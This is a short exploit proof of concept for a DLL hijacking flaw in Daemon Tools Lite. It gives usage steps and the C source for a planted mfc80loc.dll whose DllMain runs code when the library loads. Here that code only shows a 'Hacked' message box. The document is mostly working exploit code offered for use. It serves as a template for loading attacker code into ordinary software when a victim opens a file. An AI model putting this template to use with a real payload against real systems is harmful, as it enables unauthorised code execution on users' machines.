/*
#Demon tool lite DLL Hijacking Exploit (mfc80loc.dll)
#Author : Mohamed Clay
#Greetz : linuxac.org && isecur1ty.org && security4arabs.com && v4-team.com && all My Friends
#note : EveryOne is happy with DLL Hijacking YooooPiiii!!!!
#Tested on: Windows XP

#How to use : Place a .mds file and mfc80loc.dll in same folder and execute .mds file in
#Demon tool lite.

#mfc80loc.dll (code)
*/

#include "stdafx.h"

void init() {
MessageBox(NULL,"Mohamed Clay", "Hacked",0x00000003);
}


BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}